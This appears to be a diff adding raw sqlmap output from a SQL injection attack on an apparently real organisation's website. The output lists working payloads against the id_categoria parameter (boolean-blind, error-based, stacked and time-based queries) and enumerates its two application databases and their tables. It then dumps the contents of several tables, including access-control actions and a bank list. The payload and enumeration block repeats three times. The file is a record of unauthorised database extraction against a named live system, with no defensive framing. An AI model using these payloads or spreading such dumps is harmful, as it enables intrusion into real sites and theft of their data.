@@ -1,0 +1,1062 @@
+sqlmap identified the following injection point(s) with a total of 379 HTTP(s) requests:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sessao=textos&id_categoria=1 AND 7684=7684
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: sessao=textos&id_categoria=1 AND (SELECT 2510 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(2510=2510,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: sessao=textos&id_categoria=1;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: sessao=textos&id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] amecim_gfam
+[*] amecim_site
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sessao=textos&id_categoria=1 AND 7684=7684
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: sessao=textos&id_categoria=1 AND (SELECT 2510 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(2510=2510,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: sessao=textos&id_categoria=1;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: sessao=textos&id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: amecim_gfam
+[26 tables]
++---------------------------------+
+| acao                            |
+| banco                           |
+| cidades                         |
+| cliente_estado_civil            |
+| cliente_tipo_pessoa             |
+| clientes                        |
+| contas_receber_envio            |
+| endereco                        |
+| envio_cobranca                  |
+| estados                         |
+| financeiro_cliente_contribuicao |
+| financeiro_configuracao         |
+| financeiro_conta_corrente       |
+| financeiro_contas               |
+| financeiro_contas_itens         |
+| financeiro_fornecedor           |
+| financeiro_fornecedor_tipo      |
+| financeiro_pagamento_tipo       |
+| financeiro_plano_contas         |
+| franquia                        |
+| grupo                           |
+| grupo_acao                      |
+| menu                            |
+| modulo                          |
+| teste                           |
+| usuario                         |
++---------------------------------+
+
+Database: amecim_site
+[30 tables]
++---------------------------------+
+| acao                            |
+| agenda                          |
+| banner                          |
+| banner_categorias               |
+| banner_tamanho                  |
+| banner_tipo                     |
+| banners                         |
+| categoria                       |
+| comentar                        |
+| comentar_categoria              |
+| comunidade                      |
+| comunidade_estado_civil         |
+| comunidade_tipo_pessoa          |
+| conteudo                        |
+| enquete                         |
+| enquete_opcoes                  |
+| galeria                         |
+| galeria_imagens                 |
+| grupo                           |
+| grupo_acao                      |
+| membros                         |
+| menu                            |
+| modulo                          |
+| noticia                         |
+| noticia_categoria               |
+| noticia_imagem                  |
+| parceiros                       |
+| produtos                        |
+| produtos_imagens                |
+| usuario                         |
++---------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sessao=textos&id_categoria=1 AND 7684=7684
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: sessao=textos&id_categoria=1 AND (SELECT 2510 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(2510=2510,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: sessao=textos&id_categoria=1;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: sessao=textos&id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: amecim_gfam
+[26 tables]
++---------------------------------+
+| acao                            |
+| banco                           |
+| cidades                         |
+| cliente_estado_civil            |
+| cliente_tipo_pessoa             |
+| clientes                        |
+| contas_receber_envio            |
+| endereco                        |
+| envio_cobranca                  |
+| estados                         |
+| financeiro_cliente_contribuicao |
+| financeiro_configuracao         |
+| financeiro_conta_corrente       |
+| financeiro_contas               |
+| financeiro_contas_itens         |
+| financeiro_fornecedor           |
+| financeiro_fornecedor_tipo      |
+| financeiro_pagamento_tipo       |
+| financeiro_plano_contas         |
+| franquia                        |
+| grupo                           |
+| grupo_acao                      |
+| menu                            |
+| modulo                          |
+| teste                           |
+| usuario                         |
++---------------------------------+
+
+Database: amecim_site
+[30 tables]
++---------------------------------+
+| acao                            |
+| agenda                          |
+| banner                          |
+| banner_categorias               |
+| banner_tamanho                  |
+| banner_tipo                     |
+| banners                         |
+| categoria                       |
+| comentar                        |
+| comentar_categoria              |
+| comunidade                      |
+| comunidade_estado_civil         |
+| comunidade_tipo_pessoa          |
+| conteudo                        |
+| enquete                         |
+| enquete_opcoes                  |
+| galeria                         |
+| galeria_imagens                 |
+| grupo                           |
+| grupo_acao                      |
+| membros                         |
+| menu                            |
+| modulo                          |
+| noticia                         |
+| noticia_categoria               |
+| noticia_imagem                  |
+| parceiros                       |
+| produtos                        |
+| produtos_imagens                |
+| usuario                         |
++---------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sessao=textos&id_categoria=1 AND 7684=7684
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: sessao=textos&id_categoria=1 AND (SELECT 2510 FROM(SELECT COUNT(*),CONCAT(0x716b787071,(SELECT (ELT(2510=2510,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries
+    Payload: sessao=textos&id_categoria=1;SELECT SLEEP(5)
+    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: sessao=textos&id_categoria=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: amecim_gfam
+[26 tables]
++---------------------------------+
+| acao                            |
+| banco                           |
+| cidades                         |
+| cliente_estado_civil            |
+| cliente_tipo_pessoa             |
+| clientes                        |
+| contas_receber_envio            |
+| endereco                        |
+| envio_cobranca                  |
+| estados                         |
+| financeiro_cliente_contribuicao |
+| financeiro_configuracao         |
+| financeiro_conta_corrente       |
+| financeiro_contas               |
+| financeiro_contas_itens         |
+| financeiro_fornecedor           |
+| financeiro_fornecedor_tipo      |
+| financeiro_pagamento_tipo       |
+| financeiro_plano_contas         |
+| franquia                        |
+| grupo                           |
+| grupo_acao                      |
+| menu                            |
+| modulo                          |
+| teste                           |
+| usuario                         |
++---------------------------------+
+
+Database: amecim_gfam
+Table: acao
+[27 entries]
++-----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------+--------+
+| id  | acao                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | nome                                  | modulo |
++-----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------+--------+
+| 1   | home|sair|limpar_filtro                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | Página inicial e configurações padrão | 1      |
+| 2   | listar_acao|frm_adicionar_acao|adicionar_acao|frm_atualizar_acao|atualizar_acao|listar_acao|deletar_acao|ajax_listar_acao|acao_pdf|acao_xlsx|acao_print|frm_configurar_listagem|configurar_listagem                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Ações                                 | 5      |
+| 3   | listar_modulo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Módulos                               | 6      |
+| 4   | listar_menu|ajax_listar_menu|frm_adicionar_menu|adicionar_menu|frm_atualizar_menu|atualizar_menu|deletar_menu                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Menu                                  | 7      |
+| 22  | frm_adicionar_usuario|adicionar_usuario|frm_atualizar_usuario|atualizar_usuario|listar_usuario|deletar_usuario|ajax_listar_usuario|frm_configurar_listagem|configurar_listagem|usuario_pdf|usuario_print|remover_foto|frm_vincular_grupos|vincular_grupos|frm_acessar_grupos|frm_modificar_foto|modificar_foto|frm_fechar_sessao|fechar_sessao|buscar_cep|json_listar_usuarios|buscar_quantidade_filhos|busca_usuario_multiselect|busca_usuario_auto_complete|checar_tutorial|frm_alterar_configuracoes|listar_usuario_franqueado                                                                                                                                                                                                                                                                                                                                                   | Usuários                              | 3      |
+| 23  | frm_atualizar_grupo|atualizar_grupo|listar_grupo|deletar_grupo|ajax_listar_grupo|popup_localizar_grupo|atualizar_funcionalidade_grupo|frm_atribuir_veiculos_rastreador|atribuir_veiculos_rastreador|veiculos_ratreadores_grupo|popup_chage_prioridade_eventos|atualizar_veiculo_grupo|atualizar_filho_grupo|atualizar_modelo_grupo|atualizar_rastreador_grupo|atualizar_ponto_interesse_grupo|listar_grupos_ponto_interesse|popup_localizar_ponto_interesse_categoria|atualizar_popup_chage_prioridade_eventos|arvore_grupos|frm_tratativas_grupo_eventos|listar_evento_tipo|gerar_sessao_tratativas|atribuir_veiculos_tratativas_grupo|adicionar_tratativas_grupo|frm_configurar_listagem|configurar_listagem|grupo_pdf|gerar_relatorio_grupo|relatorio_grupo_xlsx|relatorio_grupo_print|relatorio_grupo_pdf|grupo_print|frm_adicionar_grupo|adicionar_grupo|pop_localizar_cliente | Grupos                                | 4      |
+| 24  | frm_atualizar_grupo|atualizar_grupo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Modificar Grupo                       | 4      |
+| 58  | sair                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Sair                                  | 7      |
+| 258 | frm_adicionar_franquia|adicionar_franquia|frm_atualizar_franquia|atualizar_franquia|listar_franquia|deletar_franquia|ajax_listar_franquia|franquia_pdf|franquia_xlsx|franquia_print|frm_configurar_listagem|configurar_listagem                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Franquias                             | 8      |
+| 259 | frm_adicionar_estados|adicionar_estados|frm_atualizar_estados|atualizar_estados|listar_estados|deletar_estados|ajax_listar_estados|estados_pdf|estados_xlsx|estados_print                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Estados                               | 9      |
+| 260 | frm_adicionar_cidades|adicionar_cidades|frm_atualizar_cidades|atualizar_cidades|listar_cidades|deletar_cidades|ajax_listar_cidades|cidades_pdf|cidades_xlsx|cidades_print|frm_configurar_listagem|filtrar_cidades|cidade_id                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Cidades                               | 10     |
+| 261 | frm_adicionar_banco|adicionar_banco|frm_atualizar_banco|atualizar_banco|ajax_listar_banco|deletar_banco|listar_banco|banco_xlsx|banco_pdf|banco_print|configurar_listagembanco|frm_configurar_listagembanco                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Bancos                                | 19     |
+| 262 | frm_adicionar_cliente_estado_civil|adicionar_cliente_estado_civil|frm_atualizar_cliente_estado_civil|atualizar_cliente_estado_civil|ajax_listar_cliente_estado_civil|deletar_cliente_estado_civil|listar_cliente_estado_civil|cliente_estado_civil_xlsx|cliente_estado_civil_pdf|cliente_estado_civil_print|configurar_listagemcliente_estado_civil|frm_configurar_listagemcliente_estado_civil                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | Estado Civil                          | 13     |
+| 263 | frm_adicionar_cliente_tipo_pessoa|adicionar_cliente_tipo_pessoa|frm_atualizar_cliente_tipo_pessoa|atualizar_cliente_tipo_pessoa|ajax_listar_cliente_tipo_pessoa|deletar_cliente_tipo_pessoa|listar_cliente_tipo_pessoa|cliente_tipo_pessoa_xlsx|cliente_tipo_pessoa_pdf|cliente_tipo_pessoa_print|configurar_listagemcliente_tipo_pessoa|frm_configurar_listagemcliente_tipo_pessoa                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Tipo Pessoa                           | 14     |
+| 264 | frm_adicionar_clientes|adicionar_clientes|frm_atualizar_clientes|atualizar_clientes|ajax_listar_clientes|deletar_clientes|listar_clientes|clientes_xlsx|clientes_pdf|clientes_print|configurar_listagemclientes|frm_configurar_listagemclientes|cidade_id|filtrar_cidades|popup_localizador_clientes                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | clientes                              | 12     |
+| 265 | frm_adicionar_endereco|adicionar_endereco|frm_atualizar_endereco|atualizar_endereco|ajax_listar_endereco|deletar_endereco|listar_endereco|endereco_xlsx|endereco_pdf|endereco_print|configurar_listagemendereco|frm_configurar_listagemendereco                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | endereco                              | 0      |
+| 266 | frm_adicionar_financeiro_cliente_contribuicao|adicionar_financeiro_cliente_contribuicao|frm_atualizar_financeiro_cliente_contribuicao|atualizar_financeiro_cliente_contribuicao|ajax_listar_financeiro_cliente_contribuicao|deletar_financeiro_cliente_contribuicao|listar_financeiro_cliente_contribuicao|financeiro_cliente_contribuicao_xlsx|financeiro_cliente_contribuicao_pdf|financeiro_cliente_contribuicao_print|configurar_listagemfinanceiro_cliente_contribuicao|frm_configurar_listagemfinanceiro_cliente_contribuicao                                                                                                                                                                                                                                                                                                                                                 | financeiro_cliente_contribuicao       | 0      |
+| 267 | frm_adicionar_financeiro_conta_corrente|adicionar_financeiro_conta_corrente|frm_atualizar_financeiro_conta_corrente|atualizar_financeiro_conta_corrente|ajax_listar_financeiro_conta_corrente|deletar_financeiro_conta_corrente|listar_financeiro_conta_corrente|financeiro_conta_corrente_xlsx|financeiro_conta_corrente_pdf|financeiro_conta_corrente_print|configurar_listagemfinanceiro_conta_corrente|frm_configurar_listagemfinanceiro_conta_corrente                                                                                                                                                                                                                                                                                                                                                                                                                         | Contas Correntes                      | 15     |
+| 268 | frm_adicionar_financeiro_contas|adicionar_financeiro_contas|frm_atualizar_financeiro_contas|atualizar_financeiro_contas|ajax_listar_financeiro_contas|deletar_financeiro_contas|listar_financeiro_contas|financeiro_contas_xlsx|financeiro_contas_pdf|financeiro_contas_print|configurar_listagemfinanceiro_contas|frm_configurar_listagemfinanceiro_contas|frm_fazer_pagamento_financeiro_contas|pagamento_financeiro_contas|imprimir_fatura|impressao_recibo                                                                                                                                                                                                                                                                                                                                                                                                                      | Contas a Pagar Receber                | 11     |
+| 269 | frm_adicionar_financeiro_contas_itens|adicionar_financeiro_contas_itens|frm_atualizar_financeiro_contas_itens|atualizar_financeiro_contas_itens|ajax_listar_financeiro_contas_itens|deletar_financeiro_contas_itens|listar_financeiro_contas_itens|financeiro_contas_itens_xlsx|financeiro_contas_itens_pdf|financeiro_contas_itens_print|configurar_listagemfinanceiro_contas_itens|frm_configurar_listagemfinanceiro_contas_itens                                                                                                                                                                                                                                                                                                                                                                                                                                                 | financeiro_contas_itens               | 0      |
+| 270 | frm_adicionar_financeiro_fornecedor|adicionar_financeiro_fornecedor|frm_atualizar_financeiro_fornecedor|atualizar_financeiro_fornecedor|ajax_listar_financeiro_fornecedor|deletar_financeiro_fornecedor|listar_financeiro_fornecedor|financeiro_fornecedor_xlsx|financeiro_fornecedor_pdf|financeiro_fornecedor_print|configurar_listagemfinanceiro_fornecedor|frm_configurar_listagemfinanceiro_fornecedor|filtrar_cidades|cidade_id|popup_localizador_fornecedores                                                                                                                                                                                                                                                                                                                                                                                                                | Fornecedor                            | 17     |
+| 271 | frm_adicionar_financeiro_fornecedor_tipo|adicionar_financeiro_fornecedor_tipo|frm_atualizar_financeiro_fornecedor_tipo|atualizar_financeiro_fornecedor_tipo|ajax_listar_financeiro_fornecedor_tipo|deletar_financeiro_fornecedor_tipo|listar_financeiro_fornecedor_tipo|financeiro_fornecedor_tipo_xlsx|financeiro_fornecedor_tipo_pdf|financeiro_fornecedor_tipo_print|configurar_listagemfinanceiro_fornecedor_tipo|frm_configurar_listagemfinanceiro_fornecedor_tipo                                                                                                                                                                                                                                                                                                                                                                                                             | Tipo de Fornecedor                    | 20     |
+| 272 | frm_adicionar_financeiro_pagamento_tipo|adicionar_financeiro_pagamento_tipo|frm_atualizar_financeiro_pagamento_tipo|atualizar_financeiro_pagamento_tipo|ajax_listar_financeiro_pagamento_tipo|deletar_financeiro_pagamento_tipo|listar_financeiro_pagamento_tipo|financeiro_pagamento_tipo_xlsx|financeiro_pagamento_tipo_pdf|financeiro_pagamento_tipo_print|configurar_listagemfinanceiro_pagamento_tipo|frm_configurar_listagemfinanceiro_pagamento_tipo                                                                                                                                                                                                                                                                                                                                                                                                                         | Tipo de Pagamento                     | 18     |
+| 273 | frm_adicionar_financeiro_plano_contas|adicionar_financeiro_plano_contas|frm_atualizar_financeiro_plano_contas|atualizar_financeiro_plano_contas|ajax_listar_financeiro_plano_contas|deletar_financeiro_plano_contas|listar_financeiro_plano_contas|financeiro_plano_contas_xlsx|financeiro_plano_contas_pdf|financeiro_plano_contas_print|configurar_listagemfinanceiro_plano_contas|frm_configurar_listagemfinanceiro_plano_contas|popup_localizador_plano_contas                                                                                                                                                                                                                                                                                                                                                                                                                  | Plano de Contas                       | 16     |
+| 274 | previsao_faturamento|listar_previsao_faturamento|gerar_faturamento_itens|listar_associados_faturados                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Previsão de Faturamento               | 21     |
+| 275 | frm_adicionar_financeiro_configuracao|adicionar_financeiro_configuracao|frm_atualizar_financeiro_configuracao|atualizar_financeiro_configuracao|listar_financeiro_configuracao|deletar_financeiro_configuracao|ajax_listar_financeiro_configuracao                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | Configuração Financeiras              | 22     |
+| 276 | frm_tesouraria|listar_tesouraria|imprimir_tesouraria|pdf_tesouraria                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | Tesouraria                            | 23     |
++-----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------+--------+
+
+Database: amecim_gfam
+Table: banco
+[159 entries]
++-----+----------+---------------------------------------------------------+
+| id  | excluido | nome                                                    |
++-----+----------+---------------------------------------------------------+
+| 1   | NULL     | Banco Citicard S.A.                                     |
+| 2   | NULL     | Banco  A.J.Renner S.A.                                  |
+| 3   | NULL     | Banco ABC Brasil S.A.                                   |
+| 4   | NULL     | Banco Alfa S.A.                                         |
+| 5   | NULL     | Banco Alvorada S.A.                                     |
+| 6   | NULL     | Banco Arbi S.A.                                         |
+| 7   | NULL     | Banco Banerj S.A.                                       |
+| 8   | NULL     | Banco Banestado S.A.                                    |
+| 9   | NULL     | Banco Bankpar S.A.                                      |
+| 10  | NULL     | Banco Barclays S.A.                                     |
+| 11  | NULL     | Banco BBM S.A.                                          |
+| 12  | NULL     | Banco Beg S.A.                                          |
+| 13  | NULL     | Banco Bem S.A.                                          |
+| 14  | NULL     | Banco BGN S.A.                                          |
+| 15  | NULL     | Banco BM&F de Serviços de Liquidação e Custódia S.A     |
+| 16  | NULL     | Banco BMC S.A.                                          |
+| 17  | NULL     | Banco BMG S.A.                                          |
+| 18  | NULL     | Banco BNP Paribas Brasil S.A.                           |
+| 19  | NULL     | Banco Boavista Interatlântico S.A.                      |
+| 20  | NULL     | Banco Bonsucesso S.A.                                   |
+| 21  | NULL     | Banco Bradesco S.A.                                     |
+| 22  | NULL     | Banco Brascan S.A.                                      |
+| 23  | NULL     | Banco BRJ S.A.                                          |
+| 24  | NULL     | Banco BVA S.A.                                          |
+| 25  | NULL     | Banco Cacique S.A.                                      |
+| 26  | NULL     | Banco Calyon Brasil S.A.                                |
+| 27  | NULL     | Banco Capital S.A.                                      |
+| 28  | NULL     | Banco Cargill S.A.                                      |
+| 29  | NULL     | Banco Carrefour S.A.                                    |
+| 30  | NULL     | Banco Cédula S.A.                                       |
+| 31  | NULL     | Banco Citibank S.A.                                     |
+| 32  | NULL     | Banco Clássico S.A.                                     |
+| 33  | NULL     | Banco CNH Capital S.A.                                  |
+| 34  | NULL     | Banco Comercial e de Investimento Sudameris S.A.        |
+| 35  | NULL     | Banco Comercial Uruguai S.A.                            |
+| 36  | NULL     | Banco Cooperativo do Brasil S.A. - BANCOOB              |
+| 37  | NULL     | Banco Cooperativo Sicredi S.A. - SICREDI                |
+| 38  | NULL     | Banco CR2 S.A.                                          |
+| 39  | NULL     | Banco Credibel S.A.                                     |
+| 40  | NULL     | Banco Credit Suisse (Brasil) S.A.                       |
+| 41  | NULL     | Banco Cruzeiro do Sul S.A.                              |
+| 42  | NULL     | Banco da Amazônia S.A.                                  |
+| 43  | NULL     | Banco Daimlerchrysler S.A.                              |
+| 44  | NULL     | Banco Daycoval S.A.                                     |
+| 45  | NULL     | Banco de La Nacion Argentina                            |
+| 46  | NULL     | Banco de La Provincia de Buenos Aires                   |
+| 47  | NULL     | Banco de La Republica Oriental del Uruguay              |
+| 48  | NULL     | Banco de Lage Landen Brasil S.A.                        |
+| 49  | NULL     | Banco de Pernambuco S.A. - BANDEPE                      |
+| 50  | NULL     | Banco de Tokyo-Mitsubishi UFJ Brasil S.A.               |
+| 51  | NULL     | Banco Dibens S.A.                                       |
+| 52  | NULL     | Banco do Brasil S.A.                                    |
+| 53  | NULL     | Banco do Estado de Santa Catarina S.A.                  |
+| 54  | NULL     | Banco do Estado de Sergipe S.A.                         |
+| 55  | NULL     | Banco do Estado do Pará S.A.                            |
+| 56  | NULL     | Banco do Estado do Piauí S.A. - BEP                     |
+| 57  | NULL     | Banco do Estado do Rio Grande do Sul S.A.               |
+| 58  | NULL     | Banco do Nordeste do Brasil S.A.                        |
+| 59  | NULL     | Banco Fator S.A.                                        |
+| 60  | NULL     | Banco Fiat S.A.                                         |
+| 61  | NULL     | Banco Fibra S.A.                                        |
+| 62  | NULL     | Banco Ficsa S.A.                                        |
+| 63  | NULL     | Banco Finasa S.A.                                       |
+| 64  | NULL     | Banco Fininvest S.A.                                    |
+| 65  | NULL     | Banco Ford S.A.                                         |
+| 66  | NULL     | Banco GE Capital S.A.                                   |
+| 67  | NULL     | Banco Gerdau S.A.                                       |
+| 68  | NULL     | Banco GMAC S.A.                                         |
+| 69  | NULL     | Banco Guanabara S.A.                                    |
+| 70  | NULL     | Banco Honda S.A.                                        |
+| 71  | NULL     | Banco Ibi S.A. Banco Múltiplo                           |
+| 72  | NULL     | Banco IBM S.A.                                          |
+| 73  | NULL     | Banco Industrial do Brasil S.A.                         |
+| 74  | NULL     | Banco Industrial e Comercial S.A.                       |
+| 75  | NULL     | Banco Indusval S.A.                                     |
+| 76  | NULL     | Banco Intercap S.A.                                     |
+| 77  | NULL     | Banco Investcred Unibanco S.A.                          |
+| 78  | NULL     | Banco Itaú BBA S.A.                                     |
+| 79  | NULL     | Banco Itaú Cartões S.A.                                 |
+| 80  | NULL     | Banco Itaú Holding Financeira S.A.                      |
+| 81  | NULL     | Banco Itaú S.A.                                         |
+| 82  | NULL     | Banco ItaúBank S.A                                      |
+| 83  | NULL     | Banco Itaucred Financiamentos S.A.                      |
+| 84  | NULL     | Banco Itausaga S.A.                                     |
+| 85  | NULL     | Banco J. P. Morgan S.A.                                 |
+| 86  | NULL     | Banco J. Safra S.A.                                     |
+| 87  | NULL     | Banco John Deere S.A.                                   |
+| 88  | NULL     | Banco KDB S.A.                                          |
+| 89  | NULL     | Banco KEB do Brasil S.A.                                |
+| 90  | NULL     | Banco Luso Brasileiro S.A.                              |
+| 91  | NULL     | Banco Matone S.A.                                       |
+| 92  | NULL     | Banco Máxima S.A.                                       |
+| 93  | NULL     | Banco Maxinvest S.A.                                    |
+| 94  | NULL     | Banco Mercantil de São Paulo S.A.                       |
+| 95  | NULL     | Banco Mercantil do Brasil S.A.                          |
+| 96  | NULL     | Banco Merrill Lynch de Investimentos S.A.               |
+| 97  | NULL     | Banco Modal S.A.                                        |
+| 98  | NULL     | Banco Moneo S.A.                                        |
+| 99  | NULL     | Banco Morada S.A.                                       |
+| 100 | NULL     | Banco Morgan Stanley Dean Witter S.A.                   |
+| 101 | NULL     | Banco Nossa Caixa S.A.                                  |
+| 102 | NULL     | Banco Opportunity S.A.                                  |
+| 103 | NULL     | Banco Ourinvest S.A.                                    |
+| 104 | NULL     | Banco Panamericano S.A.                                 |
+| 105 | NULL     | Banco Paulista S.A.                                     |
+| 106 | NULL     | Banco Pecúnia S.A.                                      |
+| 107 | NULL     | Banco Pine S.A.                                         |
+| 108 | NULL     | Banco Porto Seguro S.A.                                 |
+| 109 | NULL     | Banco Pottencial S.A.                                   |
+| 110 | NULL     | Banco Prosper S.A.                                      |
+| 111 | NULL     | Banco PSA Finance Brasil S.A.                           |
+| 112 | NULL     | Banco Rabobank International Brasil S.A.                |
+| 113 | NULL     | Banco Real S.A.                                         |
+| 114 | NULL     | Banco Rendimento S.A.                                   |
+| 115 | NULL     | Banco Ribeirão Preto S.A.                               |
+| 116 | NULL     | Banco Rodobens S.A.                                     |
+| 117 | NULL     | Banco Rural Mais S.A.                                   |
+| 118 | NULL     | Banco Rural S.A.                                        |
+| 119 | NULL     | Banco Safra S.A.                                        |
+| 120 | NULL     | Banco Santander Banespa S.A.                            |
+| 121 | NULL     | Banco Schahin S.A.                                      |
+| 122 | NULL     | Banco Semear S.A.                                       |
+| 123 | NULL     | Banco Simples S.A.                                      |
+| 124 | NULL     | Banco Société Générale Brasil S.A.                      |
+| 125 | NULL     | Banco Sofisa S.A.                                       |
+| 126 | NULL     | Banco Sudameris Brasil S.A.                             |
+| 127 | NULL     | Banco Sumitomo Mitsui Brasileiro S.A.                   |
+| 128 | NULL     | Banco Toyota do Brasil S.A.                             |
+| 129 | NULL     | Banco Triângulo S.A.                                    |
+| 130 | NULL     | Banco Tricury S.A.                                      |
+| 131 | NULL     | Banco UBS Pactual S.A.                                  |
+| 132 | NULL     | Banco UBS S.A.                                          |
+| 133 | NULL     | Banco Único S.A.                                        |
+| 134 | NULL     | Banco Volkswagen S.A.                                   |
+| 135 | NULL     | Banco Volvo (Brasil) S.A.                               |
+| 136 | NULL     | Banco Votorantim S.A.                                   |
